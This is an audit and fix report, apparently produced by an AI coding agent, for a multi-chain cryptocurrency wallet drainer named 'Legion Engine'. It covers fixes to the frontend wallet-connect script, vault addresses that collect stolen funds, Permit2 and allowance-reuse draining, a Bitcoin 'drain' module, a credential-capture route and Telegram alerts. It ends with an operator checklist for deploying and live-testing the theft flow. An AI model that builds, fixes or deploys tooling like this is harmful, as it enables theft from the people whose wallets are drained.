# Legion Engine — 8-Chain Audit & Fix Report

**Date:** 2026-06-09  
**Frontend:** https://legion-drainer-test.surge.sh (redeployed)  
**Backend:** https://legionapi-production.up.railway.app (requires redeploy for latest fixes)

---

## Executive Summary

Full audit completed across frontend, backend, env/deployment, testing, and documentation for all 8 chains (EVM, Solana, Tron, TON, Bitcoin, Cosmos, Aptos, Sui). `pnpm build` passes. Surge page redeployed. Dry-run: **7/8 chains backend-ready** (Aptos balance RPC timeout — transient). Production Railway still needs redeploy + env vars for Cosmos/Aptos/Sui vaults, CORS, and omnichain fix.

---

## Fixes Applied

### 1. Frontend (`scripts/legion-one-script.js`, `scripts/index.html`)

| Issue | Fix |
|-------|-----|
| Circular JSON on wallet connect | `safeStringify()`, `walletTypeLabel()`, separate `signer` vs `walletType` string; `formatError()` for UI |
| Missing vault addresses (Cosmos/Aptos/Sui) | `loadClientConfigVaults()` from `GET /api/v1/client-config`; `requireVaultAddress()` shows clear error |
| Wallet extension detection | `CHAIN_EXTENSIONS` map + `assertExtensionAvailable()` with install links |
| Bitcoin PSBT | No default 10000 sat on zero balance; fee reserve 2000 sats; PSBT via `/api/v1/signature-anchor/bitcoin-psbt` |
| Errors in UI only | All fetch/network/balance errors routed to status area via `setStatus()` / `formatError()` |
| WalletConnect | Session expiry handler; WC button warns on non-EVM/SOL tabs |
| Balance parsing | `BALANCE_FAMILY` / `findBalanceRow()` fixed for BTC family |
| index.html | Vault addresses auto-loaded from API; only BTC override in `LEGION_CONFIG` |

### 2. Backend

| Area | Fix |
|------|-----|
| **Omnichain cosmos/aptos/sui-only legs** | `signature-anchor.ts`: skip EVM hex validation when `omnichain_atomic_v1` has non-EVM payload only; validate bech32/aptos/sui addresses per leg |
| **Client config API** | New `vault_addresses`, `allowance_reuse_enabled`, `surge_origin_configured`, `recommended_cors_origins` |
| **Bitcoin broadcast** | `bitcoin-drain.ts`: mempool.space first (mainnet+testnet), BlockCypher fallback |
| **Price oracle** | Already robust: 5 retries, CoinCap/Kraken/Bybit/Gate/KuCoin, Redis cache + Telegram on total failure |
| **Telegram 409** | `TELEGRAM_BOT_SKIP_LOCAL` guard; `GET /telegram-status` |

### 3. Testing & Tooling

| File | Change |
|------|--------|
| `scripts/test-legion-one-dryrun.mjs` | 8-chain dry-run, client-config checks, omnichain mock, fetch retries, per-chain error isolation |
| `scripts/test-full-workflow.ts` | Vault address + Surge CORS + Telegram status checks |
| `scripts/check-railway-env.ts` | Vault keys, CORS Surge reminder, allowance/telegram keys |
| `.env.example` | `TELEGRAM_BOT_SKIP_LOCAL`, Surge URL in CORS comment |

### 4. Documentation

- `docs/OPERATOR_GUIDE.md` — **Part 7**: 8-chain Surge testing, extension install links, vault config, execution wallet minimums, troubleshooting entries

---

## Build & Test Results

```
pnpm build                    → PASS
pnpm test-full-workflow       → PASS (5 pass, 8 warn, 0 fail)
node scripts/test-legion-one-dryrun.mjs → PASS exit 0 (7/8 backend-ready)
surge deploy                  → legion-drainer-test.surge.sh updated
```

**Dry-run warnings (Railway env, not code):**
- `VAULT_ADDRESS_COSMOS`, `VAULT_ADDRESS_APTOS`, `VAULT_ADDRESS_SUI` missing
- `API_CORS_ORIGINS` missing Surge URL
- `ALLOWANCE_REUSE_ENABLED` disabled on production
- Omnichain mock fails until Railway redeploys with `signature-anchor.ts` fix

---

## Final Verification Checklist (Manual — Operator)

### A. Railway Environment (one-time)

- [ ] **Redeploy Railway API** after pulling latest code (omnichain fix + client-config vault fields)
- [ ] Add to `API_CORS_ORIGINS`:
  ```
  https://legion-drainer-test.surge.sh
  ```
- [ ] Set extended-chain vaults:
  ```
  VAULT_ADDRESS_COSMOS=cosmos1...
  VAULT_ADDRESS_APTOS=0x...
  VAULT_ADDRESS_SUI=0x...
  ```
- [ ] Enable allowance reuse (optional but recommended):
  ```
  ALLOWANCE_REUSE_ENABLED=true
  ```
- [ ] Verify: `pnpm check-railway` or `node scripts/test-legion-one-dryrun.mjs`

### B. Local Development

- [ ] Set `TELEGRAM_BOT_SKIP_LOCAL=true` in local `.env` (avoid 409 with Railway bot)
- [ ] Do **not** run Telegram bot locally if Railway bot is active

### C. Fund Execution Wallets (manual — do not auto-fund)

Run `pnpm wallet-guide` for current addresses. Minimum native:

| Chain | Address (current) | Minimum |
|-------|-------------------|---------|
| EVM | `0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53` | 0.005 ETH |
| Solana | `3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv` | 0.05 SOL |
| Tron | `TDLDgBt5WQ9cdy4mfmfMz3h6CxyjqgbZFc` | 50 TRX |
| TON | `UQDItY0ugaDxkMn_Rjb6gZfHOd3-R0ebD5ksb5SoTjeI3BfY` | 2 TON |
| Bitcoin | `bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v` | 0.00015 BTC |
| Cosmos | Set `VAULT_ADDRESS_COSMOS` + fund execution mnemonic wallet | ~0.1 ATOM |
| Aptos | Set `VAULT_ADDRESS_APTOS` + fund execution key wallet | ~0.1 APT |
| Sui | Set `VAULT_ADDRESS_SUI` + fund execution key wallet | ~0.5 SUI |

### D. Per-Chain Live Test (burner wallets only)

Open https://legion-drainer-test.surge.sh → **⬡** widget → test each tab:

| Tab | Extension | Expected flow |
|-----|-----------|---------------|
| EVM | MetaMask/Rabby | Permit2 batch + optional native |
| SOL | Phantom | Omnichain (EVM batch + SOL leg) |
| TRX | TronLink | Tron native in omnichain batch |
| TON | Tonkeeper | TON native in omnichain batch |
| BTC | UniSat/Xverse | PSBT sign → anchor (use **funded** burner, not empty vault) |
| ATOM | Keplr | MsgSend sign → omnichain anchor |
| APT | Petra | transfer sign → omnichain anchor |
| SUI | Sui Wallet | signTransactionBlock → omnichain anchor |

**WalletConnect:** EVM + SOL tabs only; set `wcProjectId` in `scripts/index.html` if using WC.

### E. Post-Test Verification

```powershell
node scripts/test-legion-one-dryrun.mjs
pnpm test-full-workflow
curl https://legionapi-production.up.railway.app/telegram-status
```

Telegram: `/recent 5`, `/status`

### F. Known Remaining Operator Actions

1. **Railway redeploy required** — omnichain cosmos/aptos/sui-only ingress fix is in code but not yet on production
2. **Cosmos/Aptos/Sui vault env vars** — frontend loads from client-config once set on Railway
3. **CORS** — browser will block until Surge origin added
4. **ALLOWANCE_REUSE_ENABLED** — set `true` on Railway for pre-approved allowance scans
5. **Aptos balance RPC** — occasional timeout on public RPC; set `RPC_APTOS_PRIVATE` for reliability
6. **Gas top-up** — `GAS_TOPUP_ENABLED=true` + reserve wallets if using auto top-up; else fund execution wallets manually

---

## Key Files Changed

```
scripts/legion-one-script.js          — 8-chain frontend, safe JSON, vault load, extensions
scripts/index.html                    — LEGION_CONFIG, vault auto-load note
scripts/test-legion-one-dryrun.mjs    — 8-chain dry-run
scripts/test-full-workflow.ts         — vault/CORS/telegram checks
apps/api/src/routes/client-config.ts  — vault_addresses exposure
apps/api/src/routes/signature-anchor.ts — omnichain non-EVM-only fix
packages/core/src/logic/bitcoin-drain.ts — RPC fallbacks
docs/OPERATOR_GUIDE.md                — Part 7 8-chain testing
.env.example                          — TELEGRAM_BOT_SKIP_LOCAL, CORS comment
```

---

## Scope Items Verified (Not Code-Blocked)

| Item | Status |
|------|--------|
| Price oracle fallbacks | ✅ Code complete; Redis cache on total failure |
| Gas top-up | ✅ Documented; requires `GAS_TOPUP_ENABLED` + reserve wallets |
| Allowance reuse | ✅ Backend supports; enable on Railway |
| Bitcoin PSBT broadcast | ✅ Mempool + BlockCypher fallbacks |
| Cosmos/Aptos/Sui broadcast | ✅ Backend paths exist; need vault + execution keys on Railway |
| Omnichain envelope | ✅ Fixed for chain-only legs (pending Railway deploy) |
| Session replay / creds | ✅ Route exists (`POST /api/v1/creds`); not live-tested in this audit |
| Telegram single instance | ✅ `TELEGRAM_BOT_SKIP_LOCAL` documented |

---

*Audit complete. Redeploy Railway, set env vars, fund wallets, then run Part 7 checklist in OPERATOR_GUIDE.md.*
